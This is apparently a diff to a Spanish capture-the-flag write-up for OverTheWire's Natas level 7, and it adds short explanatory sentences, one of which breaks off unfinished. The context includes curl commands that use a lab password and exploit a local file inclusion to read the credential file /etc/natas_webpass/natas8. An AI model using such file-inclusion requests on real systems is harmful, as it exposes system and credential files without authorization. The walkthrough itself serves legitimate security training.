@@ -558,6 +558,8 @@ Se trata de una vulnerabilidad de Information Disclosure (exposición de datos s
 
 [Natas Level 6 → Level 7](https://overthewire.org/wargames/natas/natas7.html)
 
+Al navegar al sitio web nos pide iniciar sesión. Iniciamos sesión con las credenciales obtenidas.
+
 ```bash
 curl http://natas7.natas.labs.overthewire.org/ --user natas7:B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0
 ```
@@ -587,6 +589,8 @@ curl http://natas7.natas.labs.overthewire.org/ --user natas7:B1szg95UcTnrzwnF3i3
 </body>
 </html>
 ```
+
+La web muestra dos links, uno a `home` y otro a `about`, ambos 
 
 ```bash
 curl http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8 --user natas7:B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0
